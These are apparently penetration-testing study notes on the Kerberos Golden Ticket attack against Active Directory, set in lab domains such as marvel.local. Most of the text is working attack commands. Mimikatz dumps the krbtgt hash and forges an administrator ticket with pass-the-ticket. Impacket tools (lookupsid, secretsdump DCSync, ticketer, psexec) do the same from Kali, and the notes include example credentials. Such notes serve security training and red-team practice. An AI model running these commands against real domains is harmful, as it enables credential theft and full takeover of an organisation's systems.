When we compromise domain admin, dump krbtgt account hash - used to sign TGT  
we can request access to any resource or system in domain - full access to all machines in domain  
https://www.tarlogic.com/blog/how-to-attack-kerberos/  
**what we need**: domain sid, krbtgt hash  

**From Windows**:  
mimikatz.exe   
privilege::debug   
lsadump::lsa /inject /name:krbtgt  //dump krbtgt hashes  
kerberos::golden /User:AdministratorORAnyFAKENAMEWORKS /domain:marvel.local /sid:SIDOFDomain /krbtgt:NTHASHOFKRBTGT /id:500 /ptt   
misc::cmd     //opens the cmd where ticket is passed – now try any target on newly opened cmd  

Dir \\PUNISHER\c$   //should list the contents of target system with passed ticket  
//here Id is what tells systems this is admin privilege user ticket – which is why we can use any username !!  
Ptt is pass the ticket makes the generated ticket usable in cmd session.  


**From Kali**:  
lookupsid.py marvel.local/soda:"Password"@10.1.1.1  //find domain SID against DC ip, any valid domain user  
secretsdump.py -debug child/corpmngr:'User4&*&*'@cdc.child.warfare.corp -just-dc-user 'child/krbtgt'  //using admin creds – DCSync  
It is important to specify it in the form of NetBIOS domain name/user (e.g. contoso/Administratror).  
ticketer.py -nthash xxxxNTHASHnoLMxxXx -domain-sid "S-5-1-xx-xx" -domain marvel.local Alice  //generate a TGT  
export KRB5CCNAME=generatedkirb.ccache  
psexec.py marvel.local/Alice@dc02.marvel.local -k -no-pass  //use kirb  


